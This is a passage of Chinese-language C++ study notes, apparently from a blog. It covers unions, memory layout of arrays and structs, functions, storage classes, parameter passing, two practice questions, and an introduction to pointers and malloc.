<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">uarea</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> c_data;</span><br><span class="line">	<span class="type">short</span> s_data;</span><br><span class="line">	<span class="type">long</span> l_data;</span><br><span class="line">&#125;ux;</span><br></pre></td></tr></table></figure>
<p>​
新的数据类型uarea属于联合类型，它有3个成员，这三个成员共用内存空间，分配给uarea类型的变量ux的内存空间如下图所示</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230207195532331.png" /></p>
<p>​ 如果在主程序这样写：</p>
<p>​ ux.s_data=10;</p>
<p>​ ux.l_data=20;</p>
<p>​ 最终结果是：20覆盖了先存入的10；</p>
<p>​
联合类型可以不声明名称，称为<strong>无名联合</strong>，常用作<strong>结构类型的内嵌成员</strong></p>
<p>​ 联合型变量的特点：</p>
<ol type="1">
<li>同一段内存用来存放几种不同类型的成员，但在<strong>某一时刻只能存放其中一种</strong>，而不能同时存放几种</li>
<li>联合变量中起作用的成员是<strong>最后一次存放的成员</strong>，在存入一个新的成员后，原有的成员会失去作用</li>
<li>联合变量的地址和它的各个成员的地址是<strong>同一地址</strong></li>
<li>不能对联合变量名赋值，也不能在定义时初始化</li>
<li>不能用联合变量作为<strong>函数参数</strong>或<strong>返回值</strong></li>
</ol>
<h2 id="字符串的输入与输出">字符串的输入与输出</h2>
<p>​ <strong>getline</strong>(字符数组名，大小，终止处)</p>
<p>​
除了字符数组，其他类型的数组要输出数组元素的值，必须用循环语句一个元素一个元素地输出，而数组名只能代表数组的储存地址</p>
<h2 id="内存空间问题">内存空间问题</h2>
<h3 id="多维数组在内存中的存放">多维数组在内存中的存放</h3>
<p>​ 一维数组在内存中从数组名所代表的起始地址开始，按下标次序存储</p>
<p>​
二维数组在内存中从数组名所代表的起始地址开始，按行优先依次存储，数组的第i行第j列元素在内存中的起始位置相对于数组起始地址偏移了“<strong>行号
x 列数 + 列号</strong>”个int型变量空间大小</p>
<p>​
三维数组在内存中从数组名所代表的起始地址开始，按页、行、列依次存储，即按使数组元素<strong>最右边下标值最快变化来存储</strong>，数组的第k页第i行第j列元素在内存中的起始位置相对于数组起始地址偏移了“<strong>页号
x（行号 x 列数)+行号x列数+列号</strong>”个int型变量空间大小</p>
<p>​ 二维数组实际上是一维数组的一维数组；</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230207234815346.png" /></p>
<h3 id="枚举类型的内存空间">枚举类型的内存空间</h3>
<p>​
枚举元素的默认值都是整数，计算机处理数据中把枚举类型按整型(int)对待</p>
<h3 id="结构类型的内存空间">结构类型的内存空间</h3>
<p>​
某个结构类型的变量所占的存储空间是结构中所有成员所占空间的总和（按字节计）</p>
<p>​
在实际系统中会存在结构变量空间对齐问题，对于32位机，如果某个成员所占的空间不是4的倍数，系统会将其调整为4的倍数，使得结构变量所占空间一定是4的倍数，所以结构变量占用空间经常会超过数据成员应该占用空间的总和</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230207235210234.png" /></p>
<p>​
考虑到对齐的要求，系统会将所占的空间不是4的倍数的成员空间调整为4的倍数：将sex成员调整为4字节，将addr成员调整为32字节，总共占用68字节。</p>
<h1 id="第五章函数">第五章：函数</h1>
<h2 id="概述">概述</h2>
<p>​ 函数是具有一定功能又独立使用的相对独立的代码段。</p>
<p>​
函数由<strong>接口</strong>和<strong>函数体</strong>构成，函数的接口包括：<strong>函数名</strong>、<strong>函数类型</strong>和<strong>形式参数表</strong>；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​ 函数体由于实现算法。</p>
<p>​ 代码函数化的主要目的：</p>
<ul>
<li>实现模块化设计，将项目分为小模块分别实现</li>
<li>软件复用，使用现有函数能实现的功能不必重新定义新的代码</li>
<li>避免程序代码的重复书写</li>
</ul>
<h3 id="自定义函数概述">自定义函数概述</h3>
<p>​
将程序中多处使用的、实现一定功能的特定代码端定义成函数，这样的函数称为<strong>自定义函数</strong></p>
<p>​
在函数调用过程中，把实现函数调用的函数称为<strong>调用函数（主调函数）</strong>被调用的函数称为<strong>被调函数</strong>。</p>
<h3 id="库函数">库函数</h3>
<p>​ 数学库函数</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208002424370.png" /></p>
<p>​
函数定义中声明的所有变量都是<strong>局部变量</strong>，只在定义它们的函数中有效。</p>
<p>​
为实现函数之间的信息交换，多数函数需要有一定内容的<strong>形式参数</strong>表，这些形式参数也是局部变量。</p>
<h2 id="函数的定义">函数的定义</h2>
<p>​
一个C++程序可以由一个主函数和若干子函数构成。主函数main()是程序执行的开始点，由主函数调用子函数，子函数还可以继续调用其他子函数。</p>
<p>​
调用其他函数的函数称为<strong>主调函数</strong>，被其他函数调用的函数称为<strong>被调函数</strong>。</p>
<h3 id="定义函数">定义函数</h3>
<p>​ 每一个函数都是一个具有一定功能的语句模块，函数定义的语法形式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">返回值类型 函数名(形式参数表)</span><br><span class="line">&#123;</span><br><span class="line">	函数体(变量声明和语句)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>​
函数名是这个独立代码段（函数体）的外部标识符，代表这个代码段在内存的起始地址。</p>
<p>​ 函数的形式参数表：</p>
<p>​ (类型1 形式参数1，类型2 形式参数2，...，类型n 形式参数n)</p>
<p>​
其中，“类型”是各个形式参数的类型标识符，“形式参数”为各个形式参数的标识符</p>
<p>​
形式参数表从参数的<strong>类型、个数、排列顺序</strong>上规定了主调函数和被调函数之间信息交换的形式。</p>
<p>​
函数返回值类型规定了函数返回给主调函数的值的类型，也被称为<strong>函数类型</strong>。</p>
<p>​
由return语句返回的值的类型必须与函数返回值的<strong>类型一致</strong>。</p>
<p>​ 如果函数声明时没有写返回值类型，将默认为int类型。</p>
<p>​ <strong>C++不允许函数嵌套定义</strong>。</p>
<h3 id="函数原型">函数原型</h3>
<p>​ 函数原型声明语法形式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">float</span> <span class="title">maximum</span><span class="params">(<span class="type">float</span> x,<span class="type">float</span> y,<span class="type">float</span> z)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​
函数原型声明中的形式参数标识符(x,y,...)可以不同于函数定义时形式参数表中的形式参数标识符，但参数的类型、个数以及形式参数的先后次序必须与函数定义时的一致；</p>
<p>​
函数声明应该写在所有函数定义之外，表明这些函数都可以被位于原型声明之后的所有函数调用。</p>
<p>​ C++常用的库头文件：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208004012723.png" /></p>
<p>​ 程序中包含头文件，需要用编译预处理指令include，语法形式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;头文件&gt;</span><span class="comment">//用于系统的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;头文件&quot;</span><span class="comment">//用于用户自定义头文件</span></span></span><br></pre></td></tr></table></figure>
<h3 id="return语句">return语句</h3>
<p>​
当被调函数只需要将一个数值返回给主调函数时，使用return语句返回最为合适。</p>
<h2 id="函数的调用">函数的调用</h2>
<p>​
通常采用的调用方式：<strong>函数语句</strong>、<strong>函数表达式</strong>和<strong>函数参数</strong></p>
<ol type="1">
<li><p>函数语句</p>
<p>具体语句：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">函数名(实际参数表);</span><br></pre></td></tr></table></figure>
<p>实际参数表的<strong>类型、个数、排列顺序</strong>必须与被调函数声明的形式参数表一一严格对应。</p></li>
<li><p>函数表达式</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">变量名=函数名(实际参数表);</span><br><span class="line">变量名=带有函数调用的表达式;</span><br></pre></td></tr></table></figure></li>
<li><p>函数参数</p>
<p>将函数调用写在另一次函数调用的实际参数的位置</p>
<p>实际是将函数的返回值作为下次调用的实际参数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">m=<span class="built_in">max</span>(de,<span class="built_in">max</span>(a,b,c));</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="全局变量与局部变量">全局变量与局部变量</h2>
<h3 id="局部变量">局部变量</h3>
<p>​
在函数体内定义的变量和函数的形式参数，它们只能在本函数内使用，不能被其他函数访问。</p>
<p>​
局部变量能够随其所在函数被调用而被分配内存空间，也随其所在函数调用结束而消失（释放内存空间），所以使用局部变量能够<strong>提高内存利用率</strong>。</p>
<p>​
由于局部变量只能被其所在的函数访问，这种变量的数据安全性也比较好。</p>
<h3 id="全局变量">全局变量</h3>
<p>​ 在<strong>函数外部</strong>定义的变量就是全局变量。</p>
<p>​
全局变量能够被位于其定义位置之后的所有函数（属于本源文件的）共用，即全局变量的作用域是<strong>整个源文件</strong>。</p>
<p>​
全局变量在程序执行的整个过程中，始终位于全局数据区内<strong>固定的内存单元</strong>。如果程序没有初始化变量，系统会将其初始化为0。</p>
<h3 id="作用域">作用域</h3>
<p>​ 程序中标识符的作用域也就是<strong>标识符起作用的范围</strong>。</p>
<p>​
从标识符起作用的范围上划分，作用域主要分为全局作用域和局部作用域两种。</p>
<p>​
从标识符在程序中所处位置来划分，作用域又可分为<strong>块作用域</strong>、<strong>函数作用域</strong>、<strong>类作用域</strong>和<strong>文件作用域</strong>。</p>
<ul>
<li>块作用域：在程序块内定义的标识符具有块作用域。从<strong>变量定义起至本块结束</strong>。</li>
<li>函数作用域：函数作用域是指标识符的作用域为函数，从标识符定义开始到函数结束。在函数定义中，<strong>任何程序块以外所定义的变量</strong>具有函数作用域。</li>
<li>文件作用域：即全局作用域
，作用域为文件范围。在源文件所有函数之外声明或定义的标识符具有文件作用域。</li>
</ul>
<h3 id="可见性">可见性</h3>
<p>​
标识符在其<strong>作用域内</strong>，<strong>能被访问到</strong>的位置称为<strong>可见</strong>，不能被访问到的位置称为不可见。</p>
<p>​
例如：若在某个函数定义了与某个全局变量标识符相同的局部变量，则该全局变量在这个函数内不可见。</p>
<p>​
<strong>内层标识符与外层标识符同名时，内层标识符可见，外层标识符不可见。</strong></p>
<p>​ 即内层变量屏蔽外层同名变量。</p>
<p>​
如果在函数中一定要使用这个同名全局变量，可以使用<strong>全局运算符(::)</strong>指定要访问的全局变量</p>
<h2 id="结构化程序设计">结构化程序设计</h2>
<h3 id="多文件结构">多文件结构</h3>
<p>​ 多文件结构程序：即由多个源程序分别完成不同的子功能。</p>
<p>​
在实现每个子功能时，一般可使用两个源文件：一个包含程序<strong>自定义类型</strong>、<strong>符号常量定义</strong>和<strong>函数声明</strong>等头文件<strong>*.h</strong>，一个是由实现算法的函数的*<strong>.cpp</strong>文件</p>
<h3 id="编译预处理">编译预处理</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208114214213.png" /></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _DEBUG_PROGRAM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DEBUG_PROGRAM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14159265</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">	<span class="type">int</span> x,y;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>​
如果没有定义<strong>_DEBUG_PROGRAM_H</strong>，就定义一个标识符<strong>_DEBUG_PROGRAM_H</strong>，并对头文件的其他语句进行编译;否则就忽略这个头文件中的所有语句。</p>
<p>​
按这样的结构编写头文件，可以防止头文件的<strong>重复嵌入</strong>。</p>
<p>​
使用条件编译，在调试程序时显示一些调试的信息。在调试完毕后，屏蔽编译条件，调试信息就不显示了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _DEBUG_MODE</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG_MODE</span></span><br><span class="line">cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;y&lt;&lt;endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>​ 调试完后只需要将<strong>#define_DEBUG_MODE
</strong>注释掉，调试信息就不会显示。</p>
<h2 id="递归函数">递归函数</h2>
<p>​
递归函数的函数体内有调用函数自身的语句或通过其他函数间接调用函数自身。</p>
<p>​ 递归函数可读性好，但效率低。</p>
<p>​ 所有递归问题求解可分为两步：</p>
<ul>
<li>化简问题的递推阶段</li>
<li>达到递归终止条件得到基本情况的结果，并逐步回推结果阶段</li>
</ul>
<p>​
递归函数划分问题：函数中能处理的部分（直达已知）和函数不能处理的部分（结果未知）</p>
<p>​
对于还不能即可给出结果的部分，函数将简化问题，再调用递归函数，逐步达到已知结果。</p>
<p>​ 递归函数包含以下主要部分：</p>
<ul>
<li>具有更简单参数的递归调用</li>
<li>停止递归的<strong>终止条件</strong>（递归终止条件）</li>
</ul>
<p>​ 多数能用递归解决的问题，也能使用迭代的方式解决。</p>
<h2 id="内联函数">内联函数</h2>
<p>​
内联函数可以减少函数调用的时空开销，一些常用短小的函数适合采用内联函数的形式</p>
<p>​ 内联函数的定义形式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> 函数类型 函数名(形式参数表)</span><br><span class="line">&#123;</span><br><span class="line">	函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
形式上，只需要在函数类型前加个<strong>inline</strong>即可，内联函数是函数的一种特殊形式。</p>
<p>​
系统在编译程序的时候就已经<strong>把内联函数的函数体代码插入到相应的函数调用位置</strong>，<strong>成为主调函数内的一段代码</strong>，可以直接执行，<strong>不必再转换流程控制权</strong>，所以节省了时空开销，但是使得主调函数代码变长，故<strong>一般只把短小的代码写成内联函数</strong>。</p>
<ul>
<li>内联函数不能包含循环结构、switch语句</li>
<li>内联函数要先定义、后调用，不能先声明函数原型，再调用、定义</li>
</ul>
<h2 id="重载函数">重载函数</h2>
<p>​
C++允许几个功能相似的函数同名，但同名函数的形式参数必须不同，称这些同名函数为重载函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&gt;y?x:y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">max</span><span class="params">(<span class="type">float</span> x,<span class="type">float</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&gt;y?x:y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 这是两个不同的函数。</p>
<p>​
各重载函数形式参数不同是指参数的<strong>个数、类型或顺序</strong>彼此不同。</p>
<ul>
<li><p>编译器不以形式参数的标识符区分重载函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>;</span><br></pre></td></tr></table></figure>
<p>编译器认为这是同一个函数声明两次</p></li>
<li><p>编译器不以函数类型区分重载函数、</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">max</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>;</span><br></pre></td></tr></table></figure>
<p>编译器认为这是同一个函数声明两次</p></li>
<li><p>不应该将完成不同功能的函数写成重载函数</p></li>
</ul>
<h2 id="带默认参数值的函数">带默认参数值的函数</h2>
<p>​ C++允许函数的形式参数有默认值。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">double</span> <span class="title">CaircleArea</span><span class="params">(<span class="type">double</span> radius=<span class="number">1.0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">double</span> PI=<span class="number">3.14</span>;</span><br><span class="line">	<span class="keyword">return</span> PI*radius*radius;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
调用具有默认参数的函数时候，如果提供实际参数值，则采用实际参数；若不提供实际参数值，则采用默认参数值。</p>
<p>​
形式参数表中具有默认参数值的参数<strong>右边不能出现没有默认值的参数</strong>,<strong>即带有默认值的参数要在最右端</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CuboidVolumn</span><span class="params">(<span class="type">int</span> length=<span class="number">1</span>,<span class="type">int</span> width =<span class="number">1</span>,<span class="type">int</span> height=<span class="number">1</span>)</span></span>;<span class="comment">//正确</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CuboidVolumn</span><span class="params">(<span class="type">int</span> length,<span class="type">int</span> width =<span class="number">1</span>,<span class="type">int</span> height=<span class="number">1</span>)</span></span>;<span class="comment">//正确</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">CuboidVolumn</span><span class="params">(<span class="type">int</span> length=<span class="number">1</span>,<span class="type">int</span> width =<span class="number">1</span>,<span class="type">int</span> height)</span></span>;<span class="comment">//错误</span></span><br></pre></td></tr></table></figure>
<p>​ 函数在声明时便需要指定默认参数值。</p>
<h2 id="变量的存储类型和生存期">变量的存储类型和生存期</h2>
<p>​ 一个变量在内存中存在的时间取决于<strong>变量的存储类型</strong></p>
<h3 id="auto型">auto型</h3>
<p>​
auto型变量包括<strong>函数体内部定义的局部变量、函数的形式参数</strong>，称为<strong>自动变量</strong>。</p>
<p>​ 自动变量的定义一般都省略关键词auto，一般定义的变量都是自动变量。</p>
<p>​
自动变量因其<strong>所在的函数被调用而存在</strong>，随其所在函数的调用的结束而消失。</p>
<p>​
自动变量存放于<strong>栈区</strong>，不长时间占用固定内存，有利于内存资源的动态调用。</p>
<h3 id="register型">register型</h3>
<p>​ 寄存器型变量，定义形式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">register</span> 类型标识符 变量标识符;</span><br><span class="line"><span class="keyword">register</span> <span class="type">int</span> counter;</span><br></pre></td></tr></table></figure>
<p>​ 把counter放在CPU的寄存器内存储。</p>
<p>​
访问在寄存器中的变量比访问内存中的变量速度快，但由于寄存器数量有限，如果设置过多的register变量，编译器会将这些变量按auto型局部变量处理。</p>
<h3 id="extern型">extern型</h3>
<p>​ 即<strong>外部存储类型</strong></p>
<p>​
如果一个文件中的函数需要使用其他文件中定义的全局变量，可以用extern关键词声明所要用的全局变量。</p>
<p>​
提供了一个多文件程序结构不同源文件共享数据的一个途径，但需要注意数据安全。</p>
<h3 id="static型">static型</h3>
<p>​ 定义形式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> 类型标识符 变量标识名;</span><br></pre></td></tr></table></figure>
<p>​
静态变量分为<strong>静态全局变量</strong>和<strong>静态局部变量</strong>。</p>
<p>​
静态变量在程序运行期间一直在<strong>静态存储区</strong>占有<strong>固定的存储空间</strong>。</p>
<p>​</p>
<p>​
静态局部变量只在其所在函数<strong>第一次被调用时</strong>进行初始化，被初始化为指定的值。若没有指定初始化值，则系统将其初始化为0。此后静态局部变量能够<strong>保持</strong>其在前一次函数调用结束后所获得的值，直到下一次函数调用被修改。</p>
<p>​
静态全局变量只能在其定义的文件中使用，不能被多文件结构程序的其他文件访问。除此之外静态全局变量在定义它的文件用法与全局变量一致。</p>
<p>​ 静态全局变量的数据安全性优于普通全局变量。</p>
<h3 id="生存期">生存期</h3>
<p>​
一个变量在<strong>内存中存在的时间</strong>称为<strong>变量的生存期</strong>。</p>
<p>​
按生存期可以将变量分为两种：<strong>静态生存期变量</strong>和<strong>动态生存期变量</strong></p>
<p>​
auto型和register型具有动态生存期，全局变量和静态变量具有静态生存期。</p>
<p>​
具有静态生存期的变量在<strong>程序运行期间</strong>一直存在。被初始化时，若未指定初始化值，则初始化为0.</p>
<p>​
具有动态生存期的变量取决于函数是否被调用，在<strong>函数被调用期间</strong>存在。被初始化时，若未指定初始化值，则初始化为<strong>随机数</strong>.</p>
<h2 id="函数调用的执行机制">函数调用的执行机制</h2>
<p>​ 函数调用是基于函数调用工作栈实现的。</p>
<p>​ 栈空间的存取原则是先进后出。</p>
<p>​
系统在栈空间为函数调用建立<strong>工作记录</strong>，在函数的工作记录中存储主调函数的<strong>断点地址、被调函数的形式参数和自动局部变量</strong>等。</p>
<p>​
当被调函数执行完成后，系统从其工作记录中取出断点地址，并将此工作记录退栈，CPU将从主调函数的断点处继续执行。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208125027759.png" /></p>
<h2 id="参数的传递机制">参数的传递机制</h2>
<p>​ C++的函数参数传递方式分为以下两种：</p>
<ul>
<li>值转递（Pass by Value）</li>
<li>地址传递（Pass by Address）</li>
</ul>
<h3 id="值传递">值传递</h3>
<p>​
值传递：函数的形参为<strong>普通变量</strong>时，当函数被调用，系统为形参分配内存空间，并用实参值初始化形参。</p>
<p>​ 值传递方式下：</p>
<ul>
<li>实参和形参<strong>各自占有</strong>自己的内存空间；</li>
<li>参数传递方向只能由<strong>实参到形参</strong>；（参数传递的单向性）</li>
<li>不论被调函数对形参对任意更改，都<strong>不影响</strong>对应的实参；</li>
</ul>
<h3 id="地址传递">地址传递</h3>
<p>​
地址传递：函数的形参为<strong>指针变量</strong>时，当函数被调用，实参使用地址变量或地址常量，即传递给实参地址值。</p>
<ul>
<li>数组名作为形参，只将数组的<strong>起始地址</strong>传递给了被调函数，数组的大小需要单独通过值传递的方式传给被调函数；</li>
<li>如果是多维数组名作为函数的形参，则数组的<strong>每一维的大小都需要</strong>传给被调函数；</li>
<li>多维数组名作为形参，只可以省略<strong>第一维</strong>（最左边）的大小，注意<strong>下标越界</strong>问题；</li>
</ul>
<h2 id="题目">题目</h2>
<p>​
<strong>函数sumarray()计算一个数组所有元素的和，其定义如下：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sumarray</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    sum+=a[i];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 现有int
a[2][3]，若求数组a中所有元素的和，则对sumarray()调用正确的为（C）
A.sumarray(a,6)　　　　B.sumarray(a[0],6)　　　　
C.sumarray(&amp;a[0][0],6)　　　　D.sumarray(&amp;a,6)</p>
<p>​ 在内存空间看来，</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">栈空间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">a[0][0]</td>
</tr>
<tr class="even">
<td style="text-align: center;">a[0][1]</td>
</tr>
<tr class="odd">
<td style="text-align: center;">a[0][2]</td>
</tr>
<tr class="even">
<td style="text-align: center;">a[1][0]</td>
</tr>
<tr class="odd">
<td style="text-align: center;">a[1][1]</td>
</tr>
<tr class="even">
<td style="text-align: center;">a[1][2]</td>
</tr>
</tbody>
</table>
<p>​ 函数形参要求数组起始地址，所以将&amp;a[0][0]传入</p>
<p>​ <strong>5.14 下列说法正确的是(B)</strong> ​
A.内联函数在运行时是将该函数的目标代码插入每个调用该函数的地方 ​
B.内联函数在编译时是将该函数的目标代码插入每个调用该函数的地方 ​
C.类的内联函数必须在类体内定义 ​
D.类的内联函数必须在类体外通过加关键字inline定义</p>
<h1 id="第六章指针和应用">第六章：指针和应用</h1>
<h2 id="指针">指针</h2>
<h3 id="地址和指针变量">地址和指针变量</h3>
<p>​ <strong>指针变量</strong>：存放<strong>地址</strong>的变量</p>
<p>​ 对变量的<strong>直接访问</strong>：通过变量名对变量进行访问</p>
<p>​ 对内存单元的<strong>间接访问</strong>：通过地址对变量进行访问</p>
<p>​ 访问指针时，只能看到地址，只有通过这个地址才能访问地址单元的内容</p>
<h3 id="指针的定义和初始化">指针的定义和初始化</h3>
<p>​ 指针定义的格式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;变量名&gt; *变量名<span class="number">1</span>,变量名<span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> *pa1,*pa2;</span><br><span class="line"><span class="type">char</span> *pch1,*pch2;</span><br></pre></td></tr></table></figure>
<p>​ 定义指针变量时的“*”有如下两个含义：</p>
<ul>
<li>声明变量pa1、pa2等都是指针变量</li>
<li>说明变量pa1、pa2的类型是<strong>(int
<em>)<strong>型，即指向整型的指针。它们所指定的地址单元只能存放整型数据。pch1和pch2的类型是</strong>(char
</em>)</strong>类型，它们所指定的地址单元只能存放字符。</li>
</ul>
<p>​
指针变量的类型就是它所指定的<strong>地址单元中存放的数据的类型</strong>。</p>
<p>​
指针变量在声明后，变量的值是随机的，所以一般建议在定义指针时，给指针赋值为0</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *val=<span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> *ch1=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>​ 指针变量必须在初始化后才可以正确使用。</p>
<p>​ 指针变量的初始化：</p>
<ol type="1">
<li><p>在定义时初始化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型名&gt; *指针变量名=&amp;变量名;<span class="comment">//变量名和指针要同类型</span></span><br><span class="line"><span class="type">char</span> ch1=<span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line"><span class="type">char</span> *pch1=&amp;ch1;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208152438945.png" /></p></li>
<li><p>在定义指针变量后，用赋值的方式初始化</p></li>
</ol>
<p>​
没有初始化的指针变量是不可以使用的。<strong>先初始化，后使用</strong>。</p>
<h3 id="指针的使用">指针的使用</h3>
<p>​ 间接引用运算符<strong>“ *
”</strong>是<strong>一元运算符</strong>，与指针变量连用，对指针所指向的内存单元进行间接访问。</p>
<p>​ 使用格式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">* 指针变量</span><br></pre></td></tr></table></figure>
<p>​
指针可以进行的算数运算只有<strong>加减法</strong>，指针p和整数n加减的含义是相对于p的前后方偏移n个数据单元位置。</p>
<p>​ 指针和指针直接相加没有意义，且不允许。</p>
<p>​
指针和指针相减得到两个指针之间的<strong>内存长度</strong>（<strong>偏移值</strong>），而不是两个地址值的具体差值。</p>
<p>​ 不允许用整数减去一个指针。</p>
<p>​
指针的赋值运算一定是<strong>地址的赋值</strong>，可以对指针赋值的参量有：</p>
<ul>
<li>同类型变量的地址</li>
<li>同类型已经初始化的指针变量</li>
<li>向系统申请的同类型指针的地址</li>
</ul>
<p>​
<strong>不同类型的指针是不可以互相赋值的</strong>，不存在类型的自动转换。</p>
<p>​
相同类型的指针可以进行各种关系运算，两个指针<strong>相等</strong>表示它们<strong>指向同一个内存地址</strong>。</p>
<h2 id="动态内存">动态内存</h2>
<p>​
<strong>动态内存</strong>：在程序执行时才能申请、使用和释放的内存，即存放动态数据的内存区域。</p>
<p>​ <strong>堆</strong>：存放动态内存的区域</p>
<p>​ 动态内存不能通过变量名来使用，只能通过指针来使用。</p>
<p>​ 使用堆内存的情况：</p>
<ul>
<li>需要存储大量数据时</li>
<li>需要存储一组数，数据类型相同但数据个数在编程时不确定，在运行时才能确定</li>
</ul>
<h3 id="c语言的动态内存申请和释放">C语言的动态内存申请和释放</h3>
<p>​
C语言通过凸函数<strong>mallowc()</strong>申请动态内存，通过函数<strong>free()</strong>释放动态内存。</p>
<p>​ <strong>mallowc</strong>函数原型：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">malloc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​
<strong>malloc</strong>函数申请<strong>size个字节</strong>的内存空间，并返回指向所分配内存的<strong>void
</strong>*类型的指针。</p>
<p>​ <strong>void
</strong>*指针具有很好的通用性，可以通过<strong>类型转换</strong>赋值给<strong>任何类型</strong>的指针变量。</p>
<p>​ 如果没有申请到内存空间，则返回NULL。</p>
